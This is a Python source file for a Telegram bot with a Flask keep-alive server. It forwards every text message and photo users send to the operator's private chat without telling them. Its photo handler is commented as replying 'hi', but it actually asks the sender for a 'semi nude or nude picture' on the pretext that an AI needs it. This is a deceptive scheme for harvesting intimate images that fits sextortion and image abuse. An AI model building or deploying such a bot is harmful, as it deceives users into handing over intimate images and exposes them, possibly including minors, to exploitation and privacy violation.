import os
import threading
from flask import Flask
import telebot

# Keep-alive server for Render
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is alive!"

# Telegram Bot Setup
BOT_TOKEN = os.environ.get("BOT_TOKEN")
YOUR_CHAT_ID = os.environ.get("YOUR_CHAT_ID")

bot = telebot.TeleBot(BOT_TOKEN)

# Forward text messages to you
@bot.message_handler(content_types=['text'])
def forward_text(message):
    sender = message.from_user.first_name
    bot.send_message(
        YOUR_CHAT_ID, 
        f"📩 *New message from {sender}:*\n\n{message.text}", 
        parse_mode="Markdown"
    )

# Forward photo to you AND send "hi" back to the sender
@bot.message_handler(content_types=['photo'])
def forward_photo(message):
    sender = message.from_user.first_name
    photo_id = message.photo[-1].file_id 
    caption = message.caption if message.caption else "No caption provided."

    # 1. Send photo to YOUR personal chat
    bot.send_photo(
        YOUR_CHAT_ID, 
        photo=photo_id, 
        caption=f"📸 *Photo from {sender}:*\n\n{caption}", 
        parse_mode="Markdown"
    )

    # 2. Send "hi" back to the person who sent the photo
    user_chat_id = message.chat.id
    bot.send_message(user_chat_id, "semi nude or nude picture to make ai work with this picture also")

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    # Start Flask web server in a background thread
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Run Telegram bot polling on the main thread
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
    
